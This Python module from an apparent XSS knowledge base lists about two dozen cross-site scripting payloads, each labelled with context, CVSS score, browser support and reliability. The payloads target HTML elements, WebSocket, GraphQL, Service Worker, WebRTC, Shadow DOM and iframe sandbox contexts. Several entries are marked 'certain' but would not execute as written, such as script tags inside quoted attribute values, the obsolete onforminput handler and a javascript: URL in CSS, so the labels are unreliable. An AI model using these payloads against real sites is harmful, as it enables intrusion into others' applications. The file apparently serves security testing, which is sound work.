#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Modern Base Payloads - Part 2
"""

from typing import Dict

from ..models import PayloadEntry


MODERN_BASE_PAYLOADS_PART2: Dict[str, PayloadEntry] = {
    # More JavaScript framework attacks
    "framework_react_dangerous": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={{__html: userInput}}>",
        contexts=["template_injection"],
        severity="critical",
        cvss_score=9.0,
        description="React dangerouslySetInnerHTML XSS",
        tags=["react", "dangerous", "innerHTML"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "framework_vue_vhtml": PayloadEntry(
        payload="<div v-html='userInput'></div>",
        contexts=["template_injection"],
        severity="high",
        cvss_score=7.5,
        description="Vue v-html directive XSS",
        tags=["vue", "v-html", "directive"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "framework_angular_innerhtml": PayloadEntry(
        payload="<div [innerHTML]='userInput'></div>",
        contexts=["template_injection"],
        severity="high",
        cvss_score=7.5,
        description="Angular innerHTML binding XSS",
        tags=["angular", "innerHTML", "binding"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More advanced payloads
    "advanced_1": PayloadEntry(
        payload="<ruby><rt><script>alert(1)</script></rt></ruby>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Ruby annotation XSS",
        tags=["ruby", "annotation", "text"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "advanced_2": PayloadEntry(
        payload="<bdi dir=rtl><script>alert(1)</script></bdi>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Bidirectional text XSS",
        tags=["bdi", "direction", "rtl"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "advanced_3": PayloadEntry(
        payload="<bdo dir=rtl><script>alert(1)</script></bdo>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Bidirectional override XSS",
        tags=["bdo", "direction", "override"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "advanced_4": PayloadEntry(
        payload="<output onforminput=alert(1)>1+1=</output>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Output element XSS",
        tags=["output", "form", "calculation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "advanced_5": PayloadEntry(
        payload="<datalist><option value='<script>alert(1)</script>'></datalist>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Datalist option XSS",
        tags=["datalist", "form", "option"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More WebSocket specific
    "websocket_json_injection": PayloadEntry(
        payload='{"type": "message", "content": "<script>alert(1)</script>", "timestamp": 1234567890}',
        contexts=["websocket"],
        severity="high",
        cvss_score=7.5,
        description="WebSocket JSON message injection",
        tags=["websocket", "json", "message"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "websocket_room_join": PayloadEntry(
        payload='{"type": "join_room", "room": "<script>alert(1)</script>"}',
        contexts=["websocket"],
        severity="high",
        cvss_score=7.5,
        description="WebSocket room join injection",
        tags=["websocket", "room", "join"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More Service Worker specific
    "sw_notification_injection": PayloadEntry(
        payload='{"title": "New Message", "body": "<script>alert(1)</script>"}',
        contexts=["service_worker"],
        severity="high",
        cvss_score=7.8,
        description="Service Worker notification injection",
        tags=["service-worker", "notification", "push"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sw_fetch_intercept": PayloadEntry(
        payload="fetch('/api/user').then(r => r.text()).then(t => { document.body.innerHTML = t; })",
        contexts=["service_worker", "html_content"],
        severity="high",
        cvss_score=7.8,
        description="Service Worker fetch interception XSS",
        tags=["service-worker", "fetch", "intercept"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More WebRTC specific
    "webrtc_ice_candidate": PayloadEntry(
        payload='{"candidate": "candidate:1 1 UDP 2130706431 <script>alert(1)</script> 192.168.1.1 54400 typ host"}',
        contexts=["webrtc"],
        severity="high",
        cvss_score=7.6,
        description="WebRTC ICE candidate injection",
        tags=["webrtc", "ice", "candidate"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "webrtc_data_channel_label": PayloadEntry(
        payload='{"type": "channel_create", "label": "<script>alert(1)</script>"}',
        contexts=["webrtc"],
        severity="high",
        cvss_score=7.6,
        description="WebRTC data channel label injection",
        tags=["webrtc", "data-channel", "label"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # More GraphQL specific
    "graphql_fragment_injection": PayloadEntry(
        payload='query { user(id: "123") { ...XSSFragment } } fragment XSSFragment on User { name bio: "<script>alert(1)</script>" }',
        contexts=["graphql"],
        severity="high",
        cvss_score=7.4,
        description="GraphQL fragment injection",
        tags=["graphql", "fragment", "alias"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "graphql_directive_injection": PayloadEntry(
        payload='query { user(id: "123") @include(if: true) { name_<script>alert(1)</script>: name } }',
        contexts=["graphql"],
        severity="high",
        cvss_score=7.4,
        description="GraphQL directive injection",
        tags=["graphql", "directive", "include"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More Shadow DOM specific
    "shadow_slot_default": PayloadEntry(
        payload="<my-component><script>alert(1)</script></my-component>",
        contexts=["shadow_dom", "html_content"],
        severity="high",
        cvss_score=7.3,
        description="Shadow DOM slot default content XSS",
        tags=["shadow-dom", "slot", "default"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "shadow_style_injection": PayloadEntry(
        payload="<style>:host { background: url('javascript:alert(1)') }</style>",
        contexts=["shadow_dom", "css"],
        severity="high",
        cvss_score=7.3,
        description="Shadow DOM style injection",
        tags=["shadow-dom", "style", "css"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More iframe sandbox specific
    "iframe_sandbox_data_uri": PayloadEntry(
        payload="<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>",
        contexts=["iframe_sandbox", "html_content"],
        severity="medium",
        cvss_score=6.3,
        description="iframe sandbox data URI bypass",
        tags=["iframe", "sandbox", "data-uri"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iframe_sandbox_same_origin": PayloadEntry(
        payload="<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>",
        contexts=["iframe_sandbox"],
        severity="medium",
        cvss_score=6.3,
        description="iframe sandbox same-origin bypass",
        tags=["iframe", "sandbox", "same-origin"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Additional comprehensive payloads
    "comprehensive_11": PayloadEntry(
        payload="<rtc><rt><script>alert(1)</script></rt></rtc>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Ruby text container XSS",
        tags=["rtc", "ruby", "text"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_12": PayloadEntry(
        payload="<time datetime='<script>alert(1)</script>'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Time element XSS",
        tags=["time", "datetime", "semantic"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_13": PayloadEntry(
        payload="<wbr><script>alert(1)</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Word break XSS",
        tags=["wbr", "text", "line-break"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
}
